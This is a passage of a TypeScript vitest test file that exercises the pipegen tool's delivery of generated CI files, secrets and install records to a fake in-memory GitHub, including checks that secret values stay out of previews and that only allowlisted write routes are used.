// v0.2 Plan G G10 (plan Task 7 "deliver"; rulings S11, S13, S14, S17, S26; carries CF-1, D-m6, E-b15, F-8, G1 → G10, G28; Plan V
// pre-flight §5 items 1-7, binding): the proven draft goes out as the one setup PR (and the central PR), the secrets pipegen needs before
// the merge are stored (an existing one only with its own yes), and the install record is written to all three places. Every GitHub call
// goes to an in-memory GitHub (test/helpers/deliver-github.ts); no network.
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { gitBlobSha } from '../src/create/guard.js';
import { SecretVault } from '../src/create/secrets.js';
import { HOOK_FILES } from '../src/engine/created-builders.js';
import { centralProjectName } from '../src/engine/central-path.js';
import { newRateBudget } from '../src/engine/github-rate.js';
import { pubKeySha256 } from '../src/engine/signing.js';
import { PromptCancelledError, type Prompter } from '../src/cli/io.js';
import { deliver, deliverCentral, dropRunSigningEnvironment, makeRunSigningEnvironment, PART_ORDER, planDelivery, previewText, SETUP_BRANCH, type DeliveryInput, type DeliverDeps, type SigningKey } from '../src/deliver/deliver.js';
import { DELIVER_WRITE_ROUTES, DeliverError, ghRead, ghWrite } from '../src/deliver/git-data.js';
import { confirmView, TYPED_VIEW_FIELDS } from '../src/deliver/trust.js';
import { InstallRecordSchema, readRecord, recordFileText, recordHash, recordMarker, recordPath, writeLocalRecord, writeRecord } from '../src/deliver/record.js';
import * as recordMod from '../src/deliver/record.js';
import * as deliverMod from '../src/deliver/deliver.js';
import { COMPAT_PREFIX, HARNESS_PATH } from '../src/proof/harness.js';
import { trustedForRun } from '../src/cli/run.js';
import type { LockPlan } from '../src/layers/locks.js';
import { emptyRepoFiles, emptyServiceQuality } from '../src/read/quality.js';
import type { CreatedFile, PipelineDraft, RepoProfile } from '../src/types.js';
import { cosignKey, cosignPub } from './helpers/cosign-keys.js';
import { FakeGitHub } from './helpers/deliver-github.js';

// ---------- fixtures ----------

const KEY = ['STRIPE', 'KEY'].join('_');
const KEY_VALUE = ['sk', 'test', 'q'.repeat(24)].join('_');
const FP = 'PIPEGEN_FP_KEY';
const CO_ORIG = '* @someone\n';
const HOOK_ORIG = 'repos:\n  - repo: https://example.invalid/x\n    rev: v1\n    hooks: [{ id: x }]\n';
const PJ = '{\n  "name": "app",\n  "scripts": { "test": "echo \\"Error: no test specified\\" && exit 1" }\n}\n';
const PJ_NEW = '{\n  "name": "app",\n  "scripts": { "test": "vitest run" },\n  "devDependencies": { "vitest": "5.0.5" }\n}\n';
const LOCK = '{ "name": "app", "lockfileVersion": 3, "packages": {} }\n';
const LOCK_NEW = '{ "name": "app", "lockfileVersion": 3, "packages": { "node_modules/vitest": { "version": "5.0.5" } } }\n';
const DEPLOY_ORIG = 'on: { push: { branches: [main] } }\njobs:\n  deploy:\n    runs-on: ubuntu-24.04\n    steps: [{ run: ./deploy.sh }]\n';
const DEPLOY_NEW = 'on: { push: { branches: [main] } }\njobs:\n  pipegen-verify:\n    runs-on: ubuntu-24.04\n    steps: [{ run: "true" }]\n  deploy:\n    needs: [pipegen-verify]\n    runs-on: ubuntu-24.04\n    steps: [{ run: ./deploy.sh }]\n';
const PW = 'P'.repeat(40);
/** The environment secret list's key, spelled at run time (test/no-secret-literals.test.ts). */
const LIST = ['sec', 'rets'].join('');
const SIGNING = { key: cosignKey(), pub: cosignPub(), [['pass', 'word'].join('')]: PW } as unknown as SigningKey;
/** The secret-name request parameter, spelled at run time (test/no-secret-literals.test.ts). */
const NAME_PARAM = ['secret', 'name'].join('_');
const nameOf = (c: { params: Record<string, unknown> }): unknown => c.params[NAME_PARAM];
const NAMES_IN = [KEY];

function profile(over: Partial<RepoProfile> = {}): RepoProfile {
  return {
    owner: 'o', repo: 'r', defaultBranch: 'main', private: true, ownerType: 'User', plan: 'pro', monorepo: 'none',
    services: [{ name: 'app', path: '.', language: 'node', packageManager: 'npm', npmLockfileVersion: 3, hasTests: true, envVars: [KEY], dependsOn: [], scripts: ['test'], frameworks: [], quality: emptyServiceQuality() }],
    terraformDirs: [], hasCompose: false, existingWorkflows: [], precommit: null, repoFiles: { ...emptyRepoFiles(), codeowners: 'CODEOWNERS' }, ...over,
  };
}
function draftOf(p: RepoProfile, pin: string | null, over: Partial<PipelineDraft> = {}): PipelineDraft {
  return {
    profile: p, capabilities: { branchProtection: true, environments: true, envRequiredReviewers: true, deploymentBranchPolicies: true, attestations: false, codeScanning: true, keylessSigningAllowed: false },
    needs: [], steps: [], created: [], notProven: [], testDecisions: [], layersSkipped: [], scoreboard: [], requireDeployApproval: false, skipped: [], suggestions: [],
    ...(pin === null ? {} : { centralPin: { repo: `${p.owner}/pipelines`, sha: pin } }), ...over,
  };
}
const cf = (path: string, content: string, part: CreatedFile['part'], over: Partial<CreatedFile> = {}): CreatedFile => ({ path, content, part, reason: `pipegen writes ${path}`, repo: 'app', ...over });
const centralFiles = (tag = ''): CreatedFile[] => [
  cf('.github/workflows/r--merge.yml', `on: { workflow_call: {} }\njobs: { gate: { runs-on: ubuntu-24.04, steps: [{ run: "true" }] } }${tag}\n`, 'pipeline', { repo: 'central' }),
  cf('.github/workflows/r--nightly.yml', 'on: { workflow_call: {} }\njobs: { n: { runs-on: ubuntu-24.04, steps: [{ run: "true" }] } }\n', 'pipeline', { repo: 'central' }),
];
const caller = (pin: string | null): string => pin === null
  ? 'on: { pull_request: null }\njobs:\n  pipegen: { uses: ./.github/workflows/pipegen-merge.yml }\n'
  : `on: { pull_request: null }\njobs:\n  pipegen: { uses: o/pipelines/.github/workflows/r--merge.yml@${pin} }\n`;
function appFiles(pin: string | null, opts: { withPkg?: boolean } = {}): CreatedFile[] {
  return [
    cf('.github/workflows/pipegen.yml', caller(pin), 'pipeline'),
    cf('PIPEGEN.md', '# pipegen\n', 'docs'),
    cf('Dockerfile', 'FROM node:24\n', 'docker', { aiEdited: true }),
    cf('.dockerignore', 'node_modules\n', 'docker'),
    cf('CODEOWNERS', `${CO_ORIG}\n# pipegen:begin\n.github/workflows/** @a @b\n# pipegen:end\n`, 'codeowners', { edited: { original: CO_ORIG } }),
    cf(HOOK_FILES['pre-commit'], `${HOOK_ORIG}  # pipegen:hooks\n  - repo: local\n`, 'precommit', { edited: { original: HOOK_ORIG } }),
    cf('.github/workflows/deploy.yml', DEPLOY_NEW, 'deploy-verify', { inserted: { original: DEPLOY_ORIG, jobs: ['pipegen-verify'], needs: [{ job: 'deploy', added: ['pipegen-verify'] }] } }),
    ...(opts.withPkg === false ? [] : [
      cf('package.json', PJ_NEW, 'tests', { needsConfirm: true, edited: { original: PJ } }),
      cf('package-lock.json', LOCK_NEW, 'tests', { needsConfirm: true, edited: { original: LOCK } }),
    ]),
  ];
}
const req = (route: string, name: string, extra: Record<string, unknown> = {}) => ({ method: 'POST' as const, route, params: { owner: 'o', repo: 'r' }, body: { name, ...extra } });
function locks(over: Partial<LockPlan> = {}): LockPlan {
  const reviews = req('/repos/{owner}/{repo}/rulesets', 'pipegen-reviews', { rules: [{ type: 'pull_request', parameters: { require_code_owner_review: true } }] });
  return {
    rulesets: { gate: req('/repos/{owner}/{repo}/rulesets', 'pipegen'), reviews },
    centralRuleset: { ...req('/repos/{owner}/{repo}/rulesets', 'pipegen', { rules: [{ type: 'pull_request', parameters: { require_code_owner_review: true } }] }), params: { owner: 'o', repo: 'pipelines' } },
    codeowners: { file: appFiles(null).find((f) => f.path === 'CODEOWNERS') as CreatedFile, edit: { path: 'CODEOWNERS', kind: 'codeowners', inserted: '# pipegen:begin\n.github/workflows/** @a @b\n# pipegen:end\n', anchor: '* @someone' } },
    codeOwners: { owners: ['@a', '@b'], writers: 2 },
    owners: { app: ['@a', '@b'], central: ['@a', '@b'] }, writers: { app: ['a', 'b'], central: ['a', 'b'] }, notes: [], ...over,
  };
}

interface World { g: FakeGitHub; home: string; vault: SecretVault; asked: string[] }
/** The world input() reads the central file list from (the last one made); a test with several worlds passes the list itself. */
let current: World | null = null;
const centralList = (w: World): string[] => [...w.g.filesAt('o/pipelines', w.g.head('o/pipelines')).keys()].sort();
/** deliverCentral's deps; `typed`: an interactive run whose user types that answer to a question. */
const cdeps = (w: World, typed?: string) => ({ local: { home: w.home, env: {} }, ...(typed === undefined ? {} : { io: io(w, { typed }), interactive: true }) });
/** The notes about trust and settings, without G10-R-sec5's "branch replaced" line (a re-run over an unmerged central PR always gets it). */
const trustNotes = (notes: readonly string[]): string[] => notes.filter((n) => !/pipegen replaced it with a fresh commit/.test(n));
const homes: string[] = [];
afterEach(() => { for (const d of homes.splice(0)) rmSync(d, { recursive: true, force: true }); });
function world(opts: { appPrivate?: boolean; centralPrivate?: boolean; appFiles?: Record<string, string>; modes?: Record<string, string>; repo?: string } = {}): World {
  const g = new FakeGitHub();
  g.addRepo(`o/${opts.repo ?? 'r'}`, { private: opts.appPrivate ?? true, files: opts.appFiles ?? { 'README.md': 'hi\n', CODEOWNERS: CO_ORIG, [HOOK_FILES['pre-commit']]: HOOK_ORIG, 'package.json': PJ, 'package-lock.json': LOCK, '.github/workflows/deploy.yml': DEPLOY_ORIG }, ...(opts.modes === undefined ? {} : { modes: opts.modes }) });
  // G17C-R1 (m1): the central repo's GitHub id is the one input()'s proofRepos names (the record keeps an id only when it is the live one)
  g.addRepo('o/pipelines', { private: opts.centralPrivate ?? true, files: { 'README.md': 'central\n' } }).id = 77;
  const home = mkdtempSync(join(tmpdir(), 'pg-deliver-'));
  homes.push(home);
  const vault = new SecretVault();
  vault.set(KEY, KEY_VALUE);
  current = { g, home, vault, asked: [] };
  return current;
}
function io(w: World, answers: { confirmRunCode?: boolean; replace?: boolean; typed?: string } = {}): Prompter {
  return {
    confirm: async (msg) => { w.asked.push(msg); return /run code/i.test(msg) ? answers.confirmRunCode ?? true : /already has/i.test(msg) ? answers.replace ?? false : false; },
    select: async () => { throw new Error('no select'); },
    // a typed answer, or (none given) what the real prompter does without a terminal
    text: async (msg) => { w.asked.push(msg); if (answers.typed === undefined) throw new PromptCancelledError('no terminal'); return answers.typed; },
  };
}
const deps = (w: World, over: Partial<DeliverDeps> = {}, answers: Parameters<typeof io>[1] = {}): DeliverDeps => ({
  io: io(w, answers), clock: { budget: newRateBudget(), sleep: async () => {} }, local: { home: w.home, env: {} }, pipegenVersion: '0.2.0', now: () => new Date('2026-11-05T12:00:00Z'), ...over,
});
function input(p: RepoProfile, pin: string | null, over: Partial<DeliveryInput> = {}, draftOver: Partial<PipelineDraft> = {}): DeliveryInput {
  return {
    draft: draftOf(p, pin, draftOver), files: [...(pin === null ? [] : centralFiles()), ...appFiles(pin)], locks: locks(), ...({ [['secret', 'Names'].join('')]: NAMES_IN } as unknown as Pick<DeliveryInput, 'secretNames'>),
    protectedPaths: ['.github/workflows/**', 'CODEOWNERS'], environments: [{ name: 'production', reviewers: true }],
    proofRepos: { central: { repoId: 77, createdByPipegen: true }, scratch: { createdByPipegen: true } },
    ...(current === null ? {} : { centralFileList: centralList(current) }), ...over,
  };
}
/** The first run of a private app: the central commit, then the app delivery. */
async function firstRun(w: World, over: Partial<DeliveryInput> = {}, dOver: Partial<DeliverDeps> = {}, answers: Parameters<typeof io>[1] = {}, draftOver: Partial<PipelineDraft> = {}) {
  const p = profile();
  const c = await deliverCentral(w.g.octokit(), p, centralFiles(), { clock: { budget: newRateBudget(), sleep: async () => {} }, ...cdeps(w) });
  if (c.kind !== 'pinned') throw new Error('expected a pin');
  // G17 row 28: as run.ts does, the commit deliverCentral made in this run goes with the delivery
  const plan = planDelivery(input(p, c.sha, { ...(c.committed === true ? { centralCommitted: c.sha } : {}), ...over }, draftOver));
  const res = await deliver(w.g.octokit(), p, plan, w.vault, deps(w, dOver, answers));
  return { p, pin: c.sha, plan, res };
}
const setupFiles = (w: World): Map<string, string> => w.g.filesAt('o/r', w.g.head('o/r', SETUP_BRANCH));
const record = async (w: World, branch?: string) => (await readRecord(w.g.octokit(), { owner: 'o', repo: 'pipelines' }, 'r', branch === undefined ? {} : { branch }))?.record;

// ---------- the tests ----------

describe('G10 delivery: preview', () => {
  it('preview: secret names only; needsConfirm shown in its own section', async () => {
    const w = world();
    const plan = planDelivery(input(profile(), 'c'.repeat(40)));
    const text = previewText(plan);
    expect(text).toContain(KEY);
    expect(text).toContain(FP);
    expect(text).not.toContain(KEY_VALUE);
    for (const v of [w.vault.get(KEY) as string]) expect(text).not.toContain(v);
    const section = text.slice(text.indexOf('Changes that run code'));
    expect(text.indexOf('Changes that run code')).toBeGreaterThan(0);
    expect(section).toContain('package.json');
    expect(section).toContain('package-lock.json');
    expect(section).toMatch(/\+.*vitest run/);
    // the needsConfirm files are not in the commit list above that section
    expect(text.slice(0, text.indexOf('Changes that run code'))).not.toMatch(/^\s+package\.json/m);
    // settings come after the merge, with the code owners only where their rule is planned
    expect(text).toMatch(/after you merge/i);
    expect(text).toContain('@a');
  });

  it('deliver: AI-written files (aiEdited) listed in the preview', async () => {
    const w = world();
    const plan = planDelivery(input(profile(), 'c'.repeat(40)));
    expect(plan.aiWritten).toEqual(['Dockerfile']);
    const text = previewText(plan);
    const at = text.indexOf('Written by the AI');
    expect(at).toBeGreaterThan(0);
    expect(text.slice(at).split('\n').slice(0, 3).join('\n')).toContain('Dockerfile');
    const { res } = await firstRun(w);
    expect(res.prUrl).toMatch(/pull\/1$/);
    expect((await record(w))?.files.find((f) => f.path === 'Dockerfile')?.aiEdited).toBe(true);
    expect((await record(w))?.files.find((f) => f.path === 'PIPEGEN.md')?.aiEdited).toBeUndefined();
  });
});

describe('G10 delivery: what goes out', () => {
  it('deliver: a new .husky/pre-commit is written executable (100755); an existing hook file keeps its mode (G6, carry m5)', async () => {
    const w = world();
    const p = profile();
    const c = await deliverCentral(w.g.octokit(), p, centralFiles(), { clock: { budget: newRateBudget(), sleep: async () => {} }, ...cdeps(w) });
    if (c.kind !== 'pinned') throw new Error('expected a pin');
    const base = input(p, c.sha);
    const husky = cf(HOOK_FILES.husky, '#!/usr/bin/env sh\n# pipegen:hooks begin: x\nnpm test\n# pipegen:hooks end\n', 'precommit', { edited: { original: '' } });
    await deliver(w.g.octokit(), p, planDelivery({ ...base, files: [...base.files, husky] }), w.vault, deps(w));
    const head = w.g.head('o/r', SETUP_BRANCH);
    expect(w.g.modeAt('o/r', head, HOOK_FILES.husky)).toBe('100755');
    expect(w.g.modeAt('o/r', head, HOOK_FILES['pre-commit'])).toBe('100644');
    expect(w.g.modeAt('o/r', head, 'PIPEGEN.md')).toBe('100644');
    expect((await record(w))?.edits.find((e) => e.path === HOOK_FILES.husky)).toMatchObject({ kind: 'hooks', originalSha: null });
  });

  it('deliver: needsConfirm declined → those files excluded, rest delivered', async () => {
    const w = world();
    const { res } = await firstRun(w, {}, {}, { confirmRunCode: false });
    const files = setupFiles(w);
    expect(files.get('package.json')).toBe(PJ);
    expect(files.get('package-lock.json')).toBe(LOCK);
    expect(files.get('Dockerfile')).toBe('FROM node:24\n');
    expect(files.get('.github/workflows/pipegen.yml')).toContain('r--merge.yml@');
    expect(w.asked.filter((q) => /run code/i.test(q)).length).toBe(1);
    expect(res.skipped.map((s) => s.what)).toEqual(expect.arrayContaining(['package.json', 'package-lock.json']));
    const r = await record(w);
    expect(r?.edits.some((e) => e.kind === 'package-json' || e.kind === 'package-lock')).toBe(false);
  });

  it('deliver: one commit per non-empty part, in order', async () => {
    const w = world();
    const base = w.g.head('o/r');
    await firstRun(w);
    const hist = w.g.history('o/r', w.g.head('o/r', SETUP_BRANCH), base).reverse();
    const parts = ['pipeline', 'precommit', 'docker', 'tests', 'codeowners', 'deploy-verify', 'docs'];
    expect(PART_ORDER.filter((x) => parts.includes(x))).toEqual(parts);
    expect(hist.length).toBe(parts.length);
    hist.forEach((c, i) => {
      expect(c.parents.length).toBe(1);
      expect(c.message, `${i}`).toContain(`(${parts[i]})`);
    });
    // after the merge, a re-run whose parts are unchanged gives no commit for them: only the changed Dockerfile's part
    const app = w.g.repo('o/r');
    app.refs.set('heads/main', w.g.head('o/r', SETUP_BRANCH));
    const merged = w.g.head('o/r');
    const p = profile();
    const v2 = new SecretVault();
    v2.set(KEY, KEY_VALUE);
    const pin = (await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w)) as { sha: string }).sha;
    const again = appFiles(pin, { withPkg: false }).filter((f) => f.edited === undefined && f.inserted === undefined).map((f) => (f.path === 'Dockerfile' ? { ...f, content: 'FROM node:26\n' } : f));
    await deliver(w.g.octokit(), p, planDelivery(input(p, pin, { files: [...centralFiles(), ...again], locks: locks({ codeowners: undefined }) })), v2, deps(w));
    const hist2 = w.g.history('o/r', w.g.head('o/r', SETUP_BRANCH), merged);
    expect(hist2.map((c) => c.message)).toEqual([expect.stringContaining('(docker)')]);
  });

  it('deliver: never includes pipegen-planted/, harness, compat copies', async () => {
    const w = world();
    const extra = [cf('pipegen-planted/secrets.py', 'x = 1\n', 'pipeline'), cf(HARNESS_PATH, 'on: push\n', 'pipeline'), cf(`${COMPAT_PREFIX}ci.yml`, 'on: push\n', 'pipeline')];
    const p = profile();
    const c = await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w));
    if (c.kind !== 'pinned') throw new Error('pin');
    const base = input(p, c.sha);
    const plan = planDelivery({ ...base, files: [...base.files, ...extra] });
    expect(plan.excluded.map((e) => e.path).sort()).toEqual([HARNESS_PATH, `${COMPAT_PREFIX}ci.yml`, 'pipegen-planted/secrets.py'].sort());
    expect(previewText(plan)).not.toContain('pipegen-planted/secrets.py');
    await deliver(w.g.octokit(), p, plan, w.vault, deps(w));
    const paths = [...setupFiles(w).keys()];
    expect(paths.some((x) => /pipegen-planted|proof-harness|pipegen-compat-/i.test(x))).toBe(false);
    expect((await record(w))?.files.some((f) => /pipegen-planted|proof-harness|pipegen-compat-/i.test(f.path))).toBe(false);
  });

  it('deliver: planted paths at any depth excluded', async () => {
    const plan = planDelivery({ ...input(profile(), 'c'.repeat(40)), files: [...input(profile(), 'c'.repeat(40)).files, cf('src/a/Pipegen-Planted./b.py', 'x\n', 'pipeline'), cf('x/y/pipegen-planted/z/w.tf', 'x\n', 'pipeline'), cf('PIPEGEN-PLANTED/k.js', 'x\n', 'pipeline')] });
    expect(plan.excluded.map((e) => e.path)).toEqual(['src/a/Pipegen-Planted./b.py', 'x/y/pipegen-planted/z/w.tf', 'PIPEGEN-PLANTED/k.js']);
    expect(plan.appCommits.flatMap((c) => c.files.map((f) => f.path)).some((x) => /planted/i.test(x))).toBe(false);
  });

  it('deliver: only the git data API (trees/commits/refs), never the contents API', async () => {
    const w = world();
    await firstRun(w, {}, { signingKey: async () => SIGNING }, {}, { signing: { mode: 'key-env', images: [], cosignPubSha256: pubKeySha256(SIGNING.pub) } });
    const routes = w.g.routes();
    expect(routes.some((r) => r.includes('/contents'))).toBe(false);
    const writes = routes.filter((r) => !r.startsWith('GET '));
    const fileWrites = w.g.calls.filter((c) => !c.route.startsWith('GET ') && JSON.stringify(c.params).includes('FROM node:24'));
    expect(fileWrites.map((c) => c.route)).toEqual(['POST /repos/{owner}/{repo}/git/trees']);
    expect(new Set(writes)).toEqual(new Set([
      'POST /repos/{owner}/{repo}/git/trees', 'POST /repos/{owner}/{repo}/git/commits', 'POST /repos/{owner}/{repo}/git/refs', 'PATCH /repos/{owner}/{repo}/git/refs/{ref}',
      'POST /repos/{owner}/{repo}/pulls', 'PATCH /repos/{owner}/{repo}/pulls/{pull_number}',
      'PUT /repos/{owner}/{repo}/actions/secrets/{secret_name}', 'PUT /repos/{owner}/{repo}/environments/{environment_name}',
      'POST /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies', 'PUT /repos/{owner}/{repo}/environments/{environment_name}/secrets/{secret_name}',
    ]));
  });

  it('deliver: a write outside the fixed list is refused before it is sent', async () => {
    const g = new FakeGitHub();
    g.addRepo('o/r');
    for (const route of ['PUT /repos/{owner}/{repo}/contents/{path}', 'POST /repos/{owner}/{repo}/rulesets', 'POST /repos/{owner}/{repo}/actions/variables', 'DELETE /repos/{owner}/{repo}/git/refs/{ref}']) {
      await expect(ghWrite(g.octokit(), route, { owner: 'o', repo: 'r' }, {})).rejects.toThrow(/not a write the delivery makes/);
    }
    await expect(ghRead(g.octokit(), 'GET /repos/{owner}/{repo}/contents/{path}', { owner: 'o', repo: 'r' }, { path: 'x' })).rejects.toThrow(/not a read/);
    expect(g.calls).toEqual([]);
  });

  it('deliver: an edited file must still be the original it was made from; a symbolic link is never written through (G1 carry, G28)', async () => {
    const w = world({ appFiles: { 'README.md': 'hi\n', CODEOWNERS: '* @changed\n', [HOOK_FILES['pre-commit']]: HOOK_ORIG, 'package.json': PJ, 'package-lock.json': LOCK, '.github/workflows/deploy.yml': DEPLOY_ORIG } });
    const before = w.g.calls.length;
    await expect(firstRun(w)).rejects.toThrow(/CODEOWNERS.*changed since/);
    expect(w.g.calls.slice(before).some((c) => c.route.includes('/repos/{owner}/{repo}/git/refs') && c.params.repo === 'r')).toBe(false);
    const w2 = world({ modes: { [HOOK_FILES['pre-commit']]: '120000' } });
    await expect(firstRun(w2)).rejects.toThrow(/symbolic link/);
    const w3 = world({ appFiles: { 'README.md': 'hi\n', CODEOWNERS: CO_ORIG, [HOOK_FILES['pre-commit']]: HOOK_ORIG, 'package.json': PJ, 'package-lock.json': LOCK, '.github/workflows/deploy.yml': DEPLOY_ORIG.replace('deploy.sh', 'other.sh') } });
    await expect(firstRun(w3)).rejects.toThrow(/deploy\.yml.*changed since/);
    // a file pipegen writes whole never replaces one it didn't write (no earlier record names it)
    const w4 = world({ appFiles: { 'README.md': 'hi\n', CODEOWNERS: CO_ORIG, [HOOK_FILES['pre-commit']]: HOOK_ORIG, 'package.json': PJ, 'package-lock.json': LOCK, '.github/workflows/deploy.yml': DEPLOY_ORIG, 'PIPEGEN.md': '# mine\n' } });
    await expect(firstRun(w4)).rejects.toThrow(/PIPEGEN\.md.*already exists/);
  });
});

describe('G10 delivery: central and the pin (S26)', () => {
  it('deliver: app PR pins only a central commit on the central default branch', async () => {
    const w = world();
    const p = profile();
    // a commit that exists in pipelines but only on a side branch
    w.g.repo('o/pipelines').refs.set('heads/side', w.g.head('o/pipelines'));
    const side = w.g.commitOn('o/pipelines', 'side', Object.fromEntries(centralFiles().map((f) => [f.path, f.content])));
    const before = w.g.calls.length;
    await expect(deliver(w.g.octokit(), p, planDelivery(input(p, side)), w.vault, deps(w))).rejects.toThrow(/not on the default branch/);
    expect(w.g.calls.slice(before).filter((c) => !c.route.startsWith('GET '))).toEqual([]);
    // on the default branch, but its tree doesn't hold the central files that were judged
    const c = await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w));
    if (c.kind !== 'pinned') throw new Error('pin');
    const other = input(p, c.sha);
    await expect(deliver(w.g.octokit(), p, planDelivery({ ...other, files: [...centralFiles(' # changed'), ...appFiles(c.sha)] }), w.vault, deps(w))).rejects.toThrow(/doesn't hold/);
    // an app file that calls the central workflows at another commit
    await expect(deliver(w.g.octokit(), p, planDelivery({ ...other, files: [...centralFiles(), ...appFiles(c.sha).map((f) => (f.path === '.github/workflows/pipegen.yml' ? { ...f, content: caller(side) } : f))] }), w.vault, deps(w))).rejects.toThrow(/another central commit/);
    // the right one goes out
    const res = await deliver(w.g.octokit(), p, planDelivery(other), w.vault, deps(w));
    expect(res.centralSha).toBe(c.sha);
    expect((await record(w))?.centralSha).toBe(c.sha);
  });

  it('G13 carry 60: a re-run whose record already names the public key (finish --rotate-key) asks for no key pair and stores none', async () => {
    const signing = { signing: { mode: 'key-env' as const, images: [], cosignPubSha256: pubKeySha256(SIGNING.pub) } };
    const w = world();
    const first = await firstRun(w, {}, { signingKey: async () => SIGNING }, {}, signing);
    const p = profile();
    const before = w.g.calls.length;
    const v2 = new SecretVault();
    v2.set(KEY, KEY_VALUE);
    const res2 = await deliver(w.g.octokit(), p, planDelivery(input(p, first.pin, {}, signing.signing === undefined ? {} : signing)), v2, deps(w));
    expect(res2.prNumber).toBe(first.res.prNumber);
    expect(w.g.calls.slice(before).some((c) => c.route.startsWith('PUT') && c.route.includes('/secrets/{secret_name}') && String(nameOf(c)).startsWith('PIPEGEN_COSIGN'))).toBe(false);
    const rec = await record(w, `pipegen/update-${centralProjectName('r')}`) ?? await record(w);
    expect(rec?.cosignPubSha256).toBe(pubKeySha256(SIGNING.pub));
    expect(rec?.environments.map((e) => e.name)).toContain('pipegen-signing');
    // a key the record doesn't name still needs the pair
    const v3 = new SecretVault();
    v3.set(KEY, KEY_VALUE);
    const other = { signing: { ...signing.signing, cosignPubSha256: 'f'.repeat(64) } };
    await expect(deliver(w.g.octokit(), p, planDelivery(input(p, first.pin, {}, other)), v3, deps(w))).rejects.toThrow(/needs the key pair/);
  });

  it('G13 carry 24: the central Actions access level the proof changed is recorded once, never replaced by a later run', async () => {
    const w = world();
    const p = profile();
    await firstRun(w, { proofRepos: { central: { repoId: 77, createdByPipegen: true, actionsAccess: { previous: 'none' } }, scratch: { createdByPipegen: true } } });
    expect((await record(w))?.central?.actionsAccess).toEqual({ previous: 'none' });
    // a later run sees the level pipegen set ('user') as "before": the first one stays
    const v2 = new SecretVault();
    v2.set(KEY, KEY_VALUE);
    const c2 = await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w));
    if (c2.kind !== 'pinned') throw new Error('expected a pin');
    await deliver(w.g.octokit(), p, planDelivery(input(p, c2.sha, { proofRepos: { central: { createdByPipegen: false, actionsAccess: { previous: 'user' } } } })), v2, deps(w));
    const rec = await record(w, `pipegen/update-${centralProjectName('r')}`) ?? await record(w);
    expect(rec?.central?.actionsAccess).toEqual({ previous: 'none' });
  });

  it('deliver: second run updates PR and opens central PR', async () => {
    const w = world();
    const first = await firstRun(w);
    expect(w.g.repo('o/r').pulls.length).toBe(1);
    expect(w.g.repo('o/pipelines').pulls.length).toBe(0);   // the first run commits to the central default branch
    // second run, central files unchanged: same setup PR, the record through the central PR
    const v2 = new SecretVault();
    v2.set(KEY, KEY_VALUE);
    const p = profile();
    const c2 = await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w));
    expect(c2).toEqual({ kind: 'pinned', sha: first.pin, done: [] });
    const res2 = await deliver(w.g.octokit(), p, planDelivery(input(p, first.pin)), v2, deps(w));
    expect(res2.prNumber).toBe(first.res.prNumber);
    expect(w.g.repo('o/r').pulls.filter((x) => x.state === 'open').length).toBe(1);
    expect(res2.centralPrUrl).toMatch(/o\/pipelines\/pull\/1$/);
    // a third run with changed central files: a central PR first, and a stop before the app PR
    const before = w.g.calls.length;
    const c3 = await deliverCentral(w.g.octokit(), p, centralFiles(' # v2'), cdeps(w));
    expect(c3.kind).toBe('central-pr');
    if (c3.kind === 'central-pr') expect(c3.message).toMatch(/merge the central PR, then run (pipegen |`npx pipegen run` )?again/i);
    expect(w.g.calls.slice(before).some((x) => x.params.repo === 'r' && !x.route.startsWith('GET '))).toBe(false);
    expect(w.g.repo('o/pipelines').pulls.filter((x) => x.state === 'open').length).toBe(1);   // the same central PR, updated, never a second one
    const branchFiles = w.g.filesAt('o/pipelines', w.g.head('o/pipelines', `pipegen/update-${centralProjectName('r')}`));
    expect(branchFiles.get('.github/workflows/r--merge.yml')).toContain('# v2');
  });

  it('G12-R1 m1: a re-run keeps the ownerEdited marker on files and edits (sticky, like adopted)', async () => {
    const w = world();
    const first = await firstRun(w);
    const r = await record(w) as NonNullable<Awaited<ReturnType<typeof record>>>;
    // pipegen update merged into the owner's PIPEGEN.md and deploy.yml earlier (as recorded)
    const marked = { ...r, files: r.files.map((f) => (f.path === 'PIPEGEN.md' ? { ...f, ownerEdited: true as const } : f)), edits: r.edits.map((e) => (e.path === '.github/workflows/deploy.yml' ? { ...e, ownerEdited: true as const } : e)) };
    w.g.commitOn('o/pipelines', 'main', { [recordPath('r')]: recordFileText(marked) }, 'record');
    await writeLocalRecord({ owner: 'o', repo: 'r' }, { recordHash: recordHash(marked), setupPr: first.res.prNumber, updatedAt: '2026-11-05T12:00:00Z' }, { home: w.home, env: {} });
    const v2 = new SecretVault();
    v2.set(KEY, KEY_VALUE);
    const p = profile();
    await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w));
    await deliver(w.g.octokit(), p, planDelivery(input(p, first.pin)), v2, deps(w));
    const r2 = await record(w, `pipegen/update-${centralProjectName('r')}`) ?? await record(w);
    expect(r2?.files.find((f) => f.path === 'PIPEGEN.md')?.ownerEdited).toBe(true);
    expect(r2?.edits.find((e) => e.path === '.github/workflows/deploy.yml')?.ownerEdited).toBe(true);
  });

  it('deliver: the required workflow and the central CODEOWNERS go with the record commit, never into the pinned commit', async () => {
    // G8 carry: the required workflow calls the merge workflow AT the pinned commit, so it can't be in that commit; it goes in the next one
    const w = world();
    const p = profile();
    const c = await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w));
    if (c.kind !== 'pinned') throw new Error('pin');
    const reqFile = cf('.github/workflows/r--required.yml', `on: { pull_request: null }\njobs:\n  pipegen-required: { uses: o/pipelines/.github/workflows/r--merge.yml@${c.sha} }\n`, 'pipeline', { repo: 'central' });
    const coFile = cf('.github/CODEOWNERS', '# pipegen:begin\n.github/workflows/** @a @b\n# pipegen:end\n', 'codeowners', { repo: 'central', edited: { original: '' } });
    const l = locks({ orgRequiredWorkflow: { file: reqFile, rule: { method: 'POST', route: '/orgs/{org}/rulesets', params: { org: 'o' }, body: { name: 'pipegen-required--r' } } } });
    await deliver(w.g.octokit(), p, planDelivery(input(p, c.sha, { locks: l, files: [...centralFiles(), reqFile, coFile, ...appFiles(c.sha)] })), w.vault, deps(w));
    expect(w.g.filesAt('o/pipelines', c.sha).has(reqFile.path)).toBe(false);
